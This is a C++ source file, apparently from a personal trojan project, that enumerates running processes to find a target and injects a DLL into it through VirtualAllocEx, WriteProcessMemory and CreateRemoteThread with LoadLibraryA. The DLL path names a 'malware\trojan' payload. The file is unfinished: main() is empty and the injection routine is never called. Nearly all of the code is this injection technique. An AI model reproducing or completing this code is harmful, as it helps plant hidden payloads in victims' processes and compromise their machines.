#include <iostream>
#include <Windows.h>
#include <Tlhelp32.h>
#include <wininet.h>

// prolly only need one of these but idk wjich one
#include <iostream>
#include <stdlib.h>
#include <string>

#include "atlbase.h"
#include "atlstr.h"
#include "comutil.h"
//

#define MAX_BUF 1024
#define pipename "\\\\.\\pipe\\LogPipe"

const char* printme = "heloworld";

//copied from https://docs.microsoft.com/en-us/cpp/text/how-to-convert-between-various-string-types?view=vs-2019
wchar_t* charp_to_wchart_tp(char* convertme) {
    size_t newsize = strlen(convertme) + 1;
    static wchar_t* wcstring = new wchar_t[newsize];
    size_t convertedchars = 0;
    mbstowcs_s(&convertedchars, wcstring, newsize, convertme, _TRUNCATE);

    return wcstring;
}


int enum_proc(std::string proc_name) {
    //TH32CS_SNAPPROCESS flag specifies that we shud enumerate all system processes
    HANDLE handle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 ProcessInfo;
    ProcessInfo.dwSize = sizeof(PROCESSENTRY32);
    while (Process32Next(handle, &ProcessInfo))
    {
        //std::cout << ProcessInfo.szExeFile << '\n';
        std::wstring pInfo = ProcessInfo.szExeFile;
        if (!pInfo.compare(charp_to_wchart_tp((char*)proc_name.c_str())))
        {
            std::cout << "Proc id: " << ProcessInfo.th32ProcessID << std::endl;
            //STD::COUT << "PID: " << PROCESSINFO.TH32PROCESSID;
            return ProcessInfo.th32ProcessID;
        }
    }
    return -1;
}

//int enum_proc(std::string proc_name) {
//    //TH32CS_SNAPPROCESS flag specifies that we shud enumerate all system processes
//    HANDLE handle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
//    PROCESSENTRY32 ProcessInfo;
//    ProcessInfo.dwSize = sizeof(PROCESSENTRY32);
//    while (Process32Next(handle, &ProcessInfo))
//    {
//        //std::cout << ProcessInfo.szExeFile << '\n';
//        std::wstring pInfo = ProcessInfo.szExeFile;
//        if (!pInfo.compare(charp_to_wchart_tp((char*)proc_name.c_str())))
//        {
//            std::cout << "Proc id: " << ProcessInfo.th32ProcessID << std::endl;
//            //STD::COUT << "PID: " << PROCESSINFO.TH32PROCESSID;
//            return ProcessInfo.th32ProcessID;
//        }
//    }
//    return -1;
//}


int injectMethods(int proc_id) {
    HANDLE hTargetProcess = NULL;
    const char* moduleName = "C:\\Users\\tojos\\Documents\\software\\security\\malware\\trojan\\Trojan\\payload\\DLL_payload\\Debug\\DLL_payload.dll";
    LPVOID pRemoteMem = NULL;
    HANDLE hRemoteThread = NULL;
    HANDLE result = NULL;
    //HMODULE dllModule;

    hTargetProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
        PROCESS_VM_WRITE, FALSE, proc_id);

    //2. allocate mem in remote proc for file path
    int remoteMemSize = sizeof(char) * (strlen(moduleName) + 1);
    pRemoteMem = VirtualAllocEx(hTargetProcess, NULL, remoteMemSize, MEM_COMMIT, PAGE_READWRITE);
    std::cout << "Remote Mem Allocated @ " << static_cast<void*>(pRemoteMem) << '\n';

    SIZE_T written;
    WriteProcessMemory(hTargetProcess, pRemoteMem, moduleName, remoteMemSize, &written);
    std::cout << "Bytes written: " << written << '\n';

    //3. createremotethread to call loadlibrary using the mem location of the allocated file path as arg
    PTHREAD_START_ROUTINE pThreadRtn = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryA");
    printf("ptrhead: %p\n", pThreadRtn);
    if (pThreadRtn == NULL) {
        std::cout << "Cant find loadlibrary" << '\n';
    }
    hRemoteThread = CreateRemoteThread(hTargetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pThreadRtn, pRemoteMem, 0, NULL);
    if (hRemoteThread == NULL) {
        std::cout << "Failure to create remote thread" << '\n';
    }
    WaitForSingleObject(hRemoteThread, INFINITE);
    std::cout << "Waiting for Thread to return" << '\n';

    DWORD exitCode = 0;
    GetExitCodeThread(hRemoteThread, &exitCode);
    std::cout << "THREAD EXIT CODE: " << exitCode << '\n';

    VirtualFreeEx(hTargetProcess, pRemoteMem, 0, MEM_RELEASE);
    CloseHandle(hRemoteThread);
    
    LoadLibraryA(moduleName);
    
    DWORD addy = (DWORD)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "VirtualAllocEx");

    return 0;
};

int main(int argc, char** argv)
{
    //STR_TABLE_HERE
    // MessageBoxA(NULL, "helloworld\n", NULL, 0);
    return 0;
}

